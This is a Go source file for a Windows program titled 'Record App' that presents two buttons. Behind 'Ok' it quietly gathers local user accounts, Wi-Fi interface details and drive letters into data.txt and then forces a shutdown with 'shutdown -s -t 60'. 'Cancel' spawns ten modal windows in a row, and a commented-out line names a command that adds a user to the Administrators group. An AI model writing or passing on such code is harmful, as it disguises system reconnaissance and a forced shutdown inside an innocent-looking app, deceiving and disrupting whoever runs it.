package main

import (
	"github.com/gonutz/wui/v2"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func main() {
	if oS() == 0 {
		windowsView()
	}
}

func windowsView() {
	window := wui.NewWindow()
	window.SetBounds(100, 50, 300, 100)
	window.SetTitle("Record App")
	button1 := wui.NewButton()
	button1.SetBounds(10, 8, 85, 25)
	button1.SetText("Ok")
	button1.SetOnClick(func() {
		users, _ := users()
		wifi, _ := wifi()
		justString := strings.Join(users, " ")
		justString2 := strings.Join(GetDrives(), " ")
		file(justString, justString2, wifi)
		err := shutdown()
		if err != nil {
			return
		}
	})
	window.Add(button1)
	button2 := wui.NewButton()
	button2.SetBounds(150, 8, 85, 25)
	button2.SetText("cancel")
	button2.SetOnClick(func() {
		for i := 1; i <= 10; i++ {
			window2 := wui.NewWindow()
			window2.SetBounds(100*i, 50*i, 300, 100)
			window2.SetTitle("Record App")
			window2.ShowModal()
		}
	})
	window.Add(button2)
	err := window.Show()
	if err != nil {
		return
	}

}

//func windows() {
//
//	//net localgroup Administrators eslam/add
//}
func users() ([]string, error) {
	clear := []string{}
	o, err := cmdOut("net user")
	if err != nil {
		return nil, err
	}
	lines := strings.Split(o, "\n")
	for l := range lines {
		line := lines[l]
		if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
			clear = append(clear, line)
		}
	}
	return clear, nil
}

func wifi() (string, error) {
	o, err := cmdOut("Netsh WLAN show interfaces")
	if err != nil {
		return o, err
	}
	return o, nil

}

func file(data string, data2 string, data4 string) {
	f, err := os.Create("data.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	_, err2 := f.WriteString(data)
	_, err3 := f.WriteString(data2)
	_, err4 := f.WriteString(data4)
	if err != nil {
		log.Fatal(err3)
	}

	if err4 != nil {
		log.Fatal(err3)
	}

	if err2 != nil {
		log.Fatal(err2)
	}
}
func GetDrives() (letters []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		_, err := os.Open(string(drive) + ":\\")
		if err == nil {
			letters = append(letters, string(drive)+":\\")
		}
	}
	return
}
func cmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func shutdown() error {
	c := "shutdown -s -t 60"
	_, err := cmdOut(c)
	return err
}

func oS() int {
	os_ := runtime.GOOS
	switch os_ {
	case "windows":
		return 0
	case "darwin":
		return 1
	case "linux":
		return 2
	default:
		return -1
	}

}

func ContainsAny(str string, elements []string) bool {
	for element := range elements {
		e := elements[element]
		if strings.Contains(str, e) {
			return true
		}
	}

	return false
}
